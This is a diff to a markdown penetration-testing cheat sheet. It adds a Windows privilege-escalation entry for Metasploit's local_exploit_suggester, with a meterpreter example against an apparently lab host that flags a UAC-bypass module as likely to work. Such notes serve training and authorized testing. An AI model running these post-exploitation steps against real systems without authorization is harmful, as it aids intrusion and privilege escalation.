@@ -59,6 +59,7 @@
 
 ### Windows privesc
  - [metasploit](#metasploit)
+    - [local_exploit_suggester](#local_exploit_suggester)
     - [mimikatz_kiwi](#mimikatz-kiwi)
  - [mimikatz](#mimikatz)
  - [impacket](#impacket)
@@ -1074,6 +1075,22 @@ uid=0(root) gid=1000(akrech) groups=1000(akrech)
 # Windows privesc
 
 ## metasploit
+
+### local_exploit_suggester
+`module`
+```
+post/multi/recon/local_exploit_suggester
+```
+`example`
+
+```
+meterpreter > run post/multi/recon/local_exploit_suggester
+
+[*] 10.10.10.5 - Collecting local exploits for x86/windows...
+[*] 10.10.10.5 - 40 exploit checks are being tried...
+[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+[-] 10.10.10.5 - Post interrupted by the console user
+```
 
 ### mimikatz kiwi
 
